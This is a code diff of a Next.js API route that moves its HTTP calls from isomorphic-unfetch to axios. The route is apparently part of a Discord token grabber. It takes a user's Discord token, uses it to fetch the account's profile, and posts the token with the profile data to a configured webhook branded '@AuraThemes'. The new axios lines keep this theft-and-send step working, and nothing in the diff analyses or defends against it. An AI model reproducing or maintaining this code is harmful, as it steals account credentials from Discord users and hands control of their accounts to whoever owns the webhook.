@@ -1,7 +1,8 @@
 import { Emojis, Languages, UserProfile, BillingSource, Embed, ResponseData } from "@/interfaces";
 import k4itrunConfig from '@k4itrunconfig';
+
 import type { NextApiRequest, NextApiResponse } from 'next';
-import fetch from 'isomorphic-unfetch';
+import axios from 'axios';
 
 const obj: ResponseData = {
   success: false,
@@ -25,31 +26,24 @@ export default async (
     }
 
     try {
-      let user = await fetch('https://discord.com/api/v9/users/@me', {
-        method: 'GET',
+      let user = await axios.get('https://discord.com/api/v9/users/@me', {
         headers: {
           'Content-Type': 'application/json',
           'Authorization': token
         }
       });
 
-      if (!user.ok) return;
+      if (user.status !== 200) return;
 
       const CONFIG_HOOK = {
         avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
         username: '@AuraThemes',
-        embeds: await embeds({ token, ...await user.json() })
+        embeds: await embeds({ token, ...user.data })
       };
 
-      const hook = await fetch(k4itrunConfig.webhook, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(CONFIG_HOOK)
-      });
-
-      if (!hook.ok) return;
+      const hook = await axios.post(k4itrunConfig.webhook, CONFIG_HOOK);
+      
+      if (hook.status !== 200) return;
     } catch (error: any) {
       console.error(error)
     }
